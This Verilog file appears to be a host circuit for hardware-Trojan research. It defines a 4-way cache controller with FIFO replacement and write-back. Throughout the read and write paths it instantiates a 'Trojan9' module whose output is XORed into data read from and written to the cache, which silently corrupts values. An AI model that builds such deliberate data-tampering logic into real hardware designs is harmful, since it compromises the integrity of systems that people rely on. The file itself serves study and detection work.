// Cache Controller Host Circuit for Trojan9
// Corrected with FIFO replacement policy and Dirty Bit support.
module trojan9_cache_host #(
    parameter [103:0] CACHE_PATTERN = 104'h123456789ABCDEF0123456789  // Cache data pattern
)(
    input wire clk,
    input wire rst,
    input wire [31:0] addr,
    input wire [31:0] wdata,
    input wire [31:0] rdata_mem, // Data read from main memory
    input wire cache_read,
    input wire cache_write,
    input wire mem_ready,
    output reg [31:0] rdata,     // Data read from cache
    output reg [31:0] wdata_mem,   // Data to write to main memory
    output reg [31:0] addr_mem,  // Address to main memory
    output reg mem_read,
    output reg mem_write,
    output reg cache_hit,
    output reg cache_ready
);

    // Sizing parameters (converted from parameter to localparam)
    localparam CACHE_WAYS = 4;             // Number of cache ways
    localparam CACHE_SETS = 64;            // Number of cache sets

    // State definitions
    localparam S_IDLE       = 3'h0;
    localparam S_LOOKUP     = 3'h1;
    localparam S_MISS_CHECK = 3'h2;
    localparam S_WRITE_BACK = 3'h3;
    localparam S_REFILL     = 3'h4;

    // Trojan interface
    wire [7:0] trojan_a, trojan_b, trojan_c, trojan_d, trojan_e;
    wire [1:0] trojan_mode;
    wire [15:0] trojan_y;

    // Address decomposition (assuming 32-byte blocks, so 5 offset bits)
    localparam TAG_WIDTH = 32 - $clog2(CACHE_SETS) - 5; // 32 - 6 - 5 = 21
    wire [5:0] index = addr[$clog2(CACHE_SETS)+4:5];
    wire [TAG_WIDTH-1:0] tag = addr[31:$clog2(CACHE_SETS)+5];
    wire [1:0] offset = addr[4:3]; // 2 bits for offset within 4-byte word

    // Cache memory components
    reg [31:0] cache_data [0:CACHE_SETS*CACHE_WAYS-1];
    reg [TAG_WIDTH-1:0] cache_tags [0:CACHE_SETS*CACHE_WAYS-1];
    reg [CACHE_SETS*CACHE_WAYS-1:0] cache_valid;
    reg [CACHE_SETS*CACHE_WAYS-1:0] cache_dirty; // Added for write-back
    reg [1:0] fifo_ptr [0:CACHE_SETS-1]; // 2 bits per set for 4 ways

    // Internal signals
    reg [103:0] cache_gen;
    reg [2:0] cache_state;
    reg [31:0] saved_wdata; // To save write data during a miss
    reg [1:0] hit_way, victim_way;
    reg [$clog2(CACHE_SETS)-1:0] index_reg; // Registered index for bit-width safety

    // Parallel lookup logic
    wire [CACHE_WAYS-1:0] hit_signals;
    wire is_hit = |hit_signals;
    genvar i;
    generate
        for (i = 0; i < CACHE_WAYS; i = i + 1) begin
            assign hit_signals[i] = cache_valid[{index, i[1:0]}] && (cache_tags[{index, i[1:0]}] == tag);
        end
    endgenerate

    // Main FSM
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            cache_state   <= S_IDLE;
            cache_valid   <= 0;
            cache_dirty   <= 0;
            cache_ready   <= 1'b1;
            cache_hit     <= 1'b0;
            mem_read      <= 1'b0;
            mem_write     <= 1'b0;
            index_reg     <= 0;
            // Initialize cache arrays and FIFO pointers
            for (integer j = 0; j < CACHE_SETS*CACHE_WAYS; j = j + 1) begin
                cache_data[j] <= 32'h0;
                cache_tags[j] <= {TAG_WIDTH{1'b0}};
            end
            for (integer k = 0; k < CACHE_SETS; k = k + 1) begin
                fifo_ptr[k] <= 2'b00;
            end
        end else begin
            // Default assignments
            cache_ready <= 1'b0;
            cache_hit   <= 1'b0;
            mem_read    <= 1'b0;
            mem_write   <= 1'b0;
            index_reg   <= index[$clog2(CACHE_SETS)-1:0]; // Register index for bit-width safety

            case (cache_state)
                S_IDLE: begin
                    cache_ready <= 1'b1;
                    if (cache_read || cache_write) begin
                        cache_state <= S_LOOKUP;
                    end
                end

                S_LOOKUP: begin
                    if (is_hit) begin
                        cache_hit <= 1'b1;
                        // Find which way has the hit
                        if (hit_signals[0])      hit_way <= 2'b00;
                        else if (hit_signals[1]) hit_way <= 2'b01;
                        else if (hit_signals[2]) hit_way <= 2'b10;
                        else                     hit_way <= 2'b11;

                        if (cache_read) begin
                            rdata <= cache_data[{index_reg, hit_way}] ^ {16'h0, trojan_y};
                            cache_ready <= 1'b1;
                            cache_state <= S_IDLE;
                        end else begin // cache_write
                            cache_data[{index_reg, hit_way}] <= wdata ^ {16'h0, trojan_y};
                            cache_dirty[{index_reg, hit_way}] <= 1'b1;
                            cache_ready <= 1'b1;
                            cache_state <= S_IDLE;
                        end
                    end else begin // Cache Miss
                        // Get victim from FIFO pointer (2 bits per set)
                        victim_way <= fifo_ptr[index_reg];
                        saved_wdata <= wdata; // Save write data if it's a write miss
                        cache_state <= S_MISS_CHECK;
                    end
                end

                S_MISS_CHECK: begin
                    // Check if victim is dirty and needs write-back
                    if (cache_dirty[{index_reg, victim_way}] && cache_valid[{index_reg, victim_way}]) begin
                        addr_mem <= {cache_tags[{index_reg, victim_way}], index_reg, 5'b0};
                        wdata_mem <= cache_data[{index_reg, victim_way}]; // Set data to write back
                        mem_write <= 1'b1;
                        cache_state <= S_WRITE_BACK;
                    end else begin
                        cache_state <= S_REFILL;
                    end
                end

                S_WRITE_BACK: begin
                    mem_write <= 1'b1;
                    // Data to be written is already set in wdata_mem
                    if (mem_ready) begin
                        cache_dirty[{index_reg, victim_way}] <= 1'b0;
                        cache_state <= S_REFILL;
                    end
                end

                S_REFILL: begin
                    addr_mem <= {tag, index_reg, 5'b0};
                    mem_read <= 1'b1;
                    if (mem_ready) begin
                        cache_data[{index_reg, victim_way}] <= rdata_mem;
                        cache_tags[{index_reg, victim_way}] <= tag;
                        cache_valid[{index_reg, victim_way}] <= 1'b1;
                        // Increment FIFO pointer (2 bits per set)
                        fifo_ptr[index_reg] <= fifo_ptr[index_reg] + 1;

                        // Service the original request that missed
                        if (cache_read) begin
                            rdata <= rdata_mem ^ {16'h0, trojan_y};
                        end else begin // cache_write
                            cache_data[{index_reg, victim_way}] <= saved_wdata ^ {16'h0, trojan_y};
                            cache_dirty[{index_reg, victim_way}] <= 1'b1;
                        end
                        cache_ready <= 1'b1;
                        cache_state <= S_IDLE;
                    end
                end

                default: cache_state <= S_IDLE;
            endcase
        end
    end

    // Trojan connections
    assign trojan_a = cache_gen[7:0];
    assign trojan_b = addr[7:0];
    assign trojan_c = wdata[7:0];
    assign trojan_d = {index_reg[$clog2(CACHE_SETS)-1:0], 2'b0};
    assign trojan_e = {4'h0, hit_way, is_hit, cache_ready};
    assign trojan_mode = cache_state[1:0];

    // Instantiate Trojan9
    Trojan9 trojan_inst (
        .a(trojan_a), .b(trojan_b), .c(trojan_c), .d(trojan_d),
        .e(trojan_e), .mode(trojan_mode), .y(trojan_y)
    );

endmodule
